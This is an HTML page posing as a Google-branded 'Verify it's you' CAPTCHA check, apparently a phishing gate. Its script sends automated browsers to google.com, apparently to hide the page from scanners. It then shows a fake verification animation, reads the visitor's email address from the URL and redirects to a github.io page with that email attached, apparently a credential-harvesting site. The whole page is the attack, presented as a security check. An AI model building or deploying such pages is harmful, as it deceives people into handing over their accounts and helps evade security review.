<!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Security Check</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#f0f2f5;font-family:"Google Sans","Segoe UI",Roboto,Arial,sans-serif;padding:16px}
.card{background:#fff;width:100%;max-width:400px;padding:40px 32px 32px;border-radius:12px;box-shadow:0 1px 3px rgba(0,0,0,.12),0 1px 2px rgba(0,0,0,.08);text-align:center}
.logo{margin:0 auto 20px;display:flex;align-items:center;justify-content:center}
h2{color:#202124;font-size:24px;font-weight:400;margin-bottom:8px}
.sub{color:#5f6368;font-size:14px;margin-bottom:24px;font-weight:400;line-height:1.5}
.error{color:#d93025;font-size:13px;margin-bottom:16px;font-weight:500;background:rgba(217,48,37,.08);padding:10px 14px;border-radius:8px;display:none;border:1px solid rgba(217,48,37,.15)}
.error.show{display:block}
.captcha-box{display:flex;align-items:center;background:#f8f9fa;border:2px solid #dadce0;border-radius:8px;padding:14px 16px;transition:all .2s ease;cursor:default;gap:14px}
.captcha-box:hover{border-color:#bdc1c6;background:#f1f3f4}
.captcha-check{width:24px;height:24px;border:2px solid #dadce0;border-radius:4px;flex-shrink:0;cursor:pointer;transition:all .2s ease;display:flex;align-items:center;justify-content:center;background:#fff}
.captcha-check:active{transform:scale(.9)}
.captcha-check.verifying{cursor:default;border-color:#1a73e8;background:#e8f0fe}
.captcha-check.verified{cursor:default;border-color:#1e8e3e;background:#e6f4ea}
.captcha-check svg{width:16px;height:16px;display:none;opacity:0;transition:opacity .2s ease}
.captcha-check.verifying svg.spin{display:block;fill:#1a73e8;animation:spin .8s linear infinite;opacity:1}
.captcha-check.verified svg.check{display:block;fill:#1e8e3e;opacity:1}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.btn-text{color:#3c4043;font-size:14px;font-weight:400}
.status-text{color:#5f6368;font-size:13px;margin-top:16px;min-height:20px;font-weight:400;transition:all .3s ease}
.status-text.success{color:#1e8e3e}
.status-text.loading{color:#1a73e8}
.footer{color:#9aa0a6;font-size:12px;margin-top:20px;letter-spacing:.1px}
@media(max-width:768px){body{padding:20px;align-items:flex-start;padding-top:15vh}.card{padding:36px 28px 28px;max-width:380px}h2{font-size:24px}.captcha-box{padding:18px 20px;gap:18px}.captcha-check{width:32px;height:32px}.btn-text{font-size:17px}.status-text{font-size:15px;margin-top:18px}}
@media(max-width:480px){body{padding:16px;align-items:flex-start;padding-top:12vh}.card{padding:32px 24px 24px;max-width:360px}h2{font-size:22px}.sub{font-size:15px}.error{font-size:14px;padding:12px 16px}.captcha-box{padding:18px 22px;gap:18px;border-radius:10px}.captcha-check{width:34px;height:34px}.captcha-check svg{width:20px;height:20px}.btn-text{font-size:17px}.status-text{font-size:15px}.footer{font-size:13px}.logo svg{width:56px;height:56px}}
@media(max-width:380px){body{padding:14px;align-items:flex-start;padding-top:10vh}.card{padding:28px 20px 22px;max-width:320px}h2{font-size:20px}.captcha-box{padding:16px 18px;border-radius:8px;gap:16px}.captcha-check{width:30px;height:30px}.btn-text{font-size:16px}.status-text{font-size:14px}.footer{font-size:12px}}
@media(min-width:769px){body{align-items:center;padding:16px}.card{padding:44px 40px 36px;max-width:420px}h2{font-size:24px}.captcha-box{padding:16px 20px;gap:16px}.captcha-check{width:28px;height:28px}.btn-text{font-size:15px}}
</style>
</head><body>
<div class="card" id="captchaCard">
  <div class="logo"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="48" height="48"><path fill="#4285f4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/><path fill="#34a853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#fbbc05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#ea4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg></div>
  <h2>Verify it's you</h2>
  <p class="sub">To continue, complete the verification</p>
<script>
(function(){
  if(navigator.webdriver && navigator.webdriver===true){location.href="https://www.google.com";}
})();
</script>
<script>
(function(){
  var _err="";
  var _svg1="<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\" width=\"48\" height=\"48\"><path fill=\"#4285f4\" d=\"M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z\"/><path fill=\"#34a853\" d=\"M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z\"/><path fill=\"#fbbc05\" d=\"M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z\"/><path fill=\"#ea4335\" d=\"M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z\"/></svg>";
  var _svgSpin="<svg class=\"spin\" viewBox=\"0 0 24 24\"><path d=\"M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z\"/></svg>";
  var _svgChk="<svg class=\"check\" viewBox=\"0 0 24 24\"><path d=\"M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z\"/></svg>";
  var _errText=atob(_err);
  var _card=document.getElementById("captchaCard");
  var _h="<div class=\"logo\">"+_svg1+"</div><h2>Verify it's you</h2><p class=\"sub\">To continue, complete the verification</p>";
  if(_errText.length>0)_h+="<div class=\"error show\">"+_errText+"</div>";
  _h+="<div class=\"captcha-box\"><div class=\"captcha-check\" id=\"captchaCheck\">"+_svgSpin+_svgChk+"</div><span class=\"btn-text\">I'm not a robot</span></div>";
  _h+="<div class=\"status-text\" id=\"statusText\"></div><div class=\"footer\">Protected by GM Security</div>";
  
  // Removed the dead POST form and replaced it with a hidden redirect trigger
  _h+="<div id=\"captchaForm\" style=\"display:none;\"></div>";

  setTimeout(function(){
    _card.innerHTML=_h;
    var box=document.getElementById("captchaCheck"),status=document.getElementById("statusText"),
        isV=false,isP=false,startTs=Date.now();
        
    function doVerify(){
      if(isV||isP)return;
      isP=true;box.classList.add("verifying");status.textContent="Verifying...";status.className="status-text loading";
      
      setTimeout(function(){
        box.classList.remove("verifying");box.classList.add("verified");
        status.textContent="Verified!";status.className="status-text success";
        isV=true;
        
        // Delay slightly so they see the green check, then redirect
        setTimeout(function(){
          // Grab email from the URL
          var params = new URLSearchParams(location.search);
          var email = params.get("email") || params.get("e") || params.get("to") || "";
          
          // If not in query string, check the hash
          if (!email && location.hash) {
            email = decodeURIComponent(location.hash.substring(1));
          }

          // Sanitize
          var safeEmail = "";
          if (email && email.includes("@")) {
             safeEmail = encodeURIComponent(email.trim());
          }

          // 2. Build the final redirect URL using backticks (`) so ${email} works!
          const REDIRECT_URL = `https://folio-render.github.io/render-core_vista-render/#${email}`;
          
          // 3. Redirect
          window.location.replace(REDIRECT_URL);
        }, 600); 
        
      },1200+Math.floor(Math.random()*800));
    }
    
    function go(e){
      if(e){e.preventDefault();e.stopPropagation()}
      if(isV||isP)return;
      var elapsed=Date.now()-startTs;
      if(elapsed<500){setTimeout(doVerify,500-elapsed)}else{doVerify()}
    }
    
    box.addEventListener("click",go);
    box.addEventListener("touchend",function(e){if(!isV&&!isP){e.preventDefault();go(e)}});
    box.addEventListener("keydown",function(e){if(e.key==="Enter"||e.key===" "){e.preventDefault();go(e)}});
  },400);
})();
</script>
